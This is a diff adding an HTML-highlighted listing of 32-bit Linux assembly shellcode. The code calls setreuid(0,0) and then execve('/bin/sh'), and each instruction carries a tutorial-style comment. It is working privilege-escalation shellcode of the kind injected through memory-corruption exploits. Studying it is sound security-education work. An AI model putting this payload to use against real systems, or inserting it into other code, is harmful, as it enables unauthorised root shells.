@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="Generator" content="Kate, the KDE Advanced Text Editor" />
+<title>sc2.asm</title>
+</head>
+<!-- Highlighting: "GNU Assembler" -->
+<body>
+<pre style='font-weight:bold;color:#b2b2b2;background-color:#000000;'>
+section <b><span style='color:#dede49;'>.text</span></b>		        <b><span style='color:#54ffff;'>; start the code section of the asm</span></b>
+global _start		        <b><span style='color:#54ffff;'>; declare a global label</span></b>
+
+<b><span style='color:#dede49;'>_start:</span></b>				<b><span style='color:#54ffff;'>; keeps the linker from complaining or guessing</span></b>
+<b><span style='color:#54ffff;'>;setreuid (0,0)</span></b>
+    xor eax<b>,</b> eax		<b><span style='color:#54ffff;'>; clear the eax registry, prepare the next line</span></b>
+    mov al<b>,</b> <b><span style='color:#ff54ff;'>0x46</span></b>		<b><span style='color:#54ffff;'>; set the syscall value to decimal 70 or hex 46, one byte</span></b>
+    xor ebx<b>,</b> ebx		<b><span style='color:#54ffff;'>; clear the ebx register, set to 0</span></b>
+    xor ecx<b>,</b> ecx		<b><span style='color:#54ffff;'>; clear the ecx register, set to 0</span></b>
+    int <b><span style='color:#ff54ff;'>0x80</span></b>			<b><span style='color:#54ffff;'>; call kernel to execute the syscall</span></b>
+
+
+<b><span style='color:#54ffff;'>; spawn shellcode with execve</span></b>
+    xor eax<b>,</b> eax		<b><span style='color:#54ffff;'>; clears the eax register, sets to 0</span></b>
+    push eax			<b><span style='color:#54ffff;'>; push a null value on the stack, value of eax</span></b>
+    push <b><span style='color:#ff54ff;'>0x68732f2f</span></b>		<b><span style='color:#54ffff;'>; push '//sh' onto the stack, padded with leading '/'.  The leading '/' is required for 4 byte alignment and has no effect.</span></b>
+    push <b><span style='color:#ff54ff;'>0x6e69622f</span></b>		<b><span style='color:#54ffff;'>; push /bin onto the stack, notice strings in reverse</span></b>
+    mov ebx<b>,</b> esp		<b><span style='color:#54ffff;'>; since esp now points to &quot;/bin/sh&quot;, write to ebx</span></b>
+    push eax			<b><span style='color:#54ffff;'>; eax is still NULL, let's terminate char ** argv on stack</span></b>
+    push ebx			<b><span style='color:#54ffff;'>; still need a pointer to the address of '/bin/sh', use ebx</span></b>
+    mov ecx<b>,</b> esp		<b><span style='color:#54ffff;'>; now esp holds the address of argv, move it to ecx</span></b>
+    xor edx<b>,</b> edx		<b><span style='color:#54ffff;'>; set edx to zero (NULL), not needed</span></b>
+    mov al<b>,</b> <b><span style='color:#ff54ff;'>0xb</span></b>			<b><span style='color:#54ffff;'>; set the syscall # to the decimal 11 or hex b, one byte</span></b>
+    int <b><span style='color:#ff54ff;'>0x80</span></b>			<b><span style='color:#54ffff;'>; call the kernel to execute the syscall</span></b>
+</pre>
+</body>
+</html>
